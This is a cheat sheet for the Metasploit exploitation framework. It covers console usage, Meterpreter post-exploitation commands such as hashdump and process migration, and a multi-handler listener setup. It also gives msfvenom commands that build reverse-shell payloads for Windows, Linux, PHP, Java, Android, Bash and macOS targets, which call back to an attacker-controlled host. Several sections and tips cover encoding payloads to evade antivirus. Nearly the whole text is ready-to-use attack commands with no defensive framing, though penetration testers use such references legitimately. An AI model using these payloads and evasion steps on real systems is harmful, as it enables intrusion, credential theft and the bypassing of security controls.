# METASPLOIT & PAYLOAD TOOLS COMPLETE CHEAT SHEET

## 1. WHAT IS METASPLOIT?

**Metasploit Framework** is the most widely used exploitation framework. It includes:

- **msfconsole** — interactive console
- **msfvenom** — payload generator
- **Meterpreter** — advanced post-exploitation shell
- **Modules** — exploits, auxiliary, post, payloads

**Key fact:** Metasploit is powerful but noisy — most AV/EDR detect default payloads.

---

## 2. MSFCONSOLE — INTERACTIVE CONSOLE

### 2.1 Basic Commands

```bash
msfconsole                    # start console
search <term>                 # search exploits/payloads
use <module_path>             # e.g., use exploit/windows/smb/ms17_010
show options                  # view module options
set RHOSTS <IP>               # target(s)
set RPORT <port>              # target port
set PAYLOAD <payload>         # select payload
set LHOST <your_IP>           # callback IP
set LPORT <port>              # callback port
exploit                       # run
run                           # alias for exploit
exploit -j                    # run in background (job)
```

### 2.2 Sessions

```
sessions -l       # list sessions
sessions -i <id>  # interact with session
background        # send to background (Ctrl+Z)
```

### 2.3 Meterpreter Commands

```
sysinfo
getuid
pwd
ls
shell
upload <local> <remote>
download <remote> <local>
hashdump
ps
migrate <pid>
```

### 2.4 Common Modules

```
exploit/windows/smb/ms17_010_eternalblue
exploit/multi/handler
exploit/linux/http/apache_mod_cgi_bash_env_exec
auxiliary/scanner/smb/smb_version
post/multi/recon/local_exploit_suggester
```

---

## 3. MSFVENOM — PAYLOAD GENERATION

### 3.1 Basic Syntax

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

### 3.2 Common Payloads

```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell64.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.py

# WAR (Java)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war

# APK (Android)
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o shell.apk

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw

# macOS
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho -o shell.macho
```

### 3.3 Encoders (AV Evasion)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
```

### 3.4 Format Conversion

```bash
# to base64
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe | base64

# to python
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f python

# to csharp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f csharp

# to hex
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f hex
```

---

## 4. HANDLER (LISTENER)

### 4.1 Multi Handler

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT <port>
exploit -j
```

### 4.2 Listener Only (Raw)

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <port>; exploit"
```

---

## 5. TIPS

1. Keep Metasploit updated: `msfupdate` or `apt upgrade`.
2. Use **x64** payloads when the target is 64-bit — default x86 fails often.
3. Encode payloads with `-i 5` for light AV evasion.
4. Migrate to a stable process right after Meterpreter connects (`migrate <pid>`).
5. `auxiliary/scanner/*` modules are non-exploit but useful for recon.
6. Use `post/multi/recon/local_exploit_suggester` for Privesc.
7. `msfvenom -l payloads` lists all available payloads.
8. For AV evasion, prefer custom payloads (Cobalt Strike, Sliver, Havoc).
